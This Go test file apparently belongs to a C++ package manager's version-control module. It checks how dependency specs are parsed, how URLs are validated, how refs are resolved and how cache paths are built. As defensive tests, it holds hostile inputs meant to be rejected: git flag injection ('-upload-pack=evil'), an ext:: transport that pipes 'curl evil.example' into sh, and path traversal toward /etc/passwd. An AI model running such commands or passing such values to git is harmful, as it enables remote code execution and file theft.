package vcs

import "testing"

func TestParseSpec(t *testing.T) {
	cases := []struct {
		in     string
		name   string
		source string
		url    string
		path   string
		ref    string
	}{
		{"github:fmtlib/fmt", "fmt", "git", "https://github.com/fmtlib/fmt.git", "", ""},
		{"github:fmtlib/fmt@11.1.4", "fmt", "git", "https://github.com/fmtlib/fmt.git", "", "11.1.4"},
		{"github:nlohmann/json@v3.11.3", "json", "git", "https://github.com/nlohmann/json.git", "", "v3.11.3"},
		{"github:abseil/abseil-cpp", "abseil-cpp", "git", "https://github.com/abseil/abseil-cpp.git", "", ""},
		{"gitlab:libeigen/eigen@3.4.0", "eigen", "git", "https://gitlab.com/libeigen/eigen.git", "", "3.4.0"},
		{"codeberg:a/b", "b", "git", "https://codeberg.org/a/b.git", "", ""},
		{"fmtlib/fmt@11.1.4", "fmt", "git", "https://github.com/fmtlib/fmt.git", "", "11.1.4"},
		{"https://example.com/team/lib.git@main", "lib", "git", "https://example.com/team/lib.git", "", "main"},
		{"https://example.com/team/lib.git", "lib", "git", "https://example.com/team/lib.git", "", ""},
		{"local:../MyLibrary", "MyLibrary", "path", "", "../MyLibrary", ""},
		{"path:../MyLibrary", "MyLibrary", "path", "", "../MyLibrary", ""},
		// A 40-character hash is a legitimate ref.
		{"github:fmtlib/fmt@123913715afeb8a437e6388b4473fcc4753e1c9a", "fmt", "git",
			"https://github.com/fmtlib/fmt.git", "", "123913715afeb8a437e6388b4473fcc4753e1c9a"},
		// Calendar and prefixed tags must survive untouched: cppm never parses them.
		{"github:abseil/abseil-cpp@20240722.0", "abseil-cpp", "git", "https://github.com/abseil/abseil-cpp.git", "", "20240722.0"},
		{"github:libsdl-org/SDL@release-2.30.9", "SDL", "git", "https://github.com/libsdl-org/SDL.git", "", "release-2.30.9"},
	}
	for _, tc := range cases {
		t.Run(tc.in, func(t *testing.T) {
			got, err := ParseSpec(tc.in)
			if err != nil {
				t.Fatalf("ParseSpec(%q): %v", tc.in, err)
			}
			if got.Name != tc.name || got.Source != tc.source ||
				got.URL != tc.url || got.Path != tc.path || got.Ref != tc.ref {
				t.Errorf("got %+v, want name=%q source=%q url=%q path=%q ref=%q",
					got, tc.name, tc.source, tc.url, tc.path, tc.ref)
			}
		})
	}
}

// A ref or path beginning with "-" would be read by git as a flag.
func TestParseSpecRejectsInjection(t *testing.T) {
	for _, bad := range []string{
		"github:a/b@-upload-pack=evil",
		"local:-rf",
		"github:a/b@../../etc",
		"github:a/b@with space",
		"github:a/b@semi;colon:x",
		"",
		"github:notownerrepo",
		"svn:a/b",
		"local:",
		"local:../x@1.0",
	} {
		t.Run(bad, func(t *testing.T) {
			if _, err := ParseSpec(bad); err == nil {
				t.Errorf("ParseSpec(%q) should have failed", bad)
			}
		})
	}
}

// The ext:: transport makes git execute an arbitrary command.
func TestValidateURLRefusesCommandTransports(t *testing.T) {
	for _, bad := range []string{
		"ext::sh -c 'curl evil.example|sh'",
		"fd::3",
		"-upload-pack=evil",
		"https://example.com/a\nb",
		"",
	} {
		if err := validateURL(bad); err == nil {
			t.Errorf("validateURL(%q) should have failed", bad)
		}
	}
	for _, good := range []string{
		"https://github.com/fmtlib/fmt.git",
		"ssh://git@example.com/a/b.git",
		"git@github.com:fmtlib/fmt.git",
	} {
		if err := validateURL(good); err != nil {
			t.Errorf("validateURL(%q) unexpectedly failed: %v", good, err)
		}
	}
}

// An annotated tag appears twice in ls-remote; the dereferenced commit is the
// one that can be pinned.
func TestResolveFromPrefersDereferencedTag(t *testing.T) {
	refs := []Ref{
		{"1111111111111111111111111111111111111111", "refs/tags/11.1.4"},
		{"2222222222222222222222222222222222222222", "refs/tags/11.1.4^{}"},
		{"3333333333333333333333333333333333333333", "refs/heads/master"},
	}
	got, err := resolveFrom(refs, "11.1.4")
	if err != nil {
		t.Fatal(err)
	}
	if got.Commit != "2222222222222222222222222222222222222222" {
		t.Errorf("expected the dereferenced commit, got %s", got.Commit)
	}
	if got.Ref != "refs/tags/11.1.4" {
		t.Errorf("resolved ref should not keep the ^{} suffix, got %q", got.Ref)
	}
}

func TestResolveFromTagBranchCommit(t *testing.T) {
	refs := []Ref{
		{"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "refs/tags/v1.0"},
		{"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb", "refs/heads/main"},
	}
	for _, tc := range []struct{ ref, want string }{
		{"v1.0", "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"},
		{"main", "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"},
		{"cccccccccccccccccccccccccccccccccccccccc", "cccccccccccccccccccccccccccccccccccccccc"},
	} {
		got, err := resolveFrom(refs, tc.ref)
		if err != nil {
			t.Fatalf("%s: %v", tc.ref, err)
		}
		if got.Commit != tc.want {
			t.Errorf("%s: got %s, want %s", tc.ref, got.Commit, tc.want)
		}
	}
	if _, err := resolveFrom(refs, "nope"); err == nil {
		t.Error("an unknown ref should fail")
	}
	// An abbreviated hash cannot be expanded without the objects.
	if _, err := resolveFrom(refs, "cccccc"); err == nil {
		t.Error("an abbreviated hash matching nothing should fail with guidance")
	}
}

func TestSourceDirIsStableAndContentAddressed(t *testing.T) {
	t.Setenv("CPPM_CACHE_DIR", "/cache")
	a := SourceDir("https://github.com/fmtlib/fmt.git", "123913715afeb8a437e6388b4473fcc4753e1c9a")
	b := SourceDir("https://github.com/fmtlib/fmt.git", "123913715afeb8a437e6388b4473fcc4753e1c9a")
	if a != b {
		t.Error("SourceDir must be deterministic")
	}
	c := SourceDir("https://github.com/fmtlib/fmt.git", "0000000000000000000000000000000000000000")
	if a == c {
		t.Error("a different commit must map to a different directory")
	}
	if want := "/cache/src/github.com/fmtlib/fmt/123913715afe"; a != want {
		t.Errorf("got %q, want %q", a, want)
	}
}

// Cache paths come from URLs, so a crafted URL must not escape the cache root.
func TestSourceDirCannotEscapeTheCache(t *testing.T) {
	t.Setenv("CPPM_CACHE_DIR", "/cache")
	for _, u := range []string{
		"https://example.com/../../etc/passwd",
		"https://example.com/a/../../../b",
		"https://../../evil/x.git",
	} {
		got := SourceDir(u, "0000000000000000000000000000000000000000")
		if !startsWith(got, "/cache/") {
			t.Errorf("%s escaped the cache: %s", u, got)
		}
		if contains(got, "..") {
			t.Errorf("%s produced a traversal path: %s", u, got)
		}
	}
}

func TestVersionishOrderIsNumericNotLexical(t *testing.T) {
	// Lexical sorting would place "9.0.0" after "10.0.0", which would make the
	// displayed tag list misleading.
	if compareVersionish("9.0.0", "10.0.0") >= 0 {
		t.Error("9.0.0 should sort before 10.0.0")
	}
	if compareVersionish("v1.9.0", "v1.10.0") >= 0 {
		t.Error("v1.9.0 should sort before v1.10.0")
	}
	if compareVersionish("11.1.4", "11.1.4") != 0 {
		t.Error("equal strings should compare equal")
	}
}

func startsWith(s, p string) bool { return len(s) >= len(p) && s[:len(p)] == p }
func contains(s, sub string) bool {
	for i := 0; i+len(sub) <= len(s); i++ {
		if s[i:i+len(sub)] == sub {
			return true
		}
	}
	return false
}
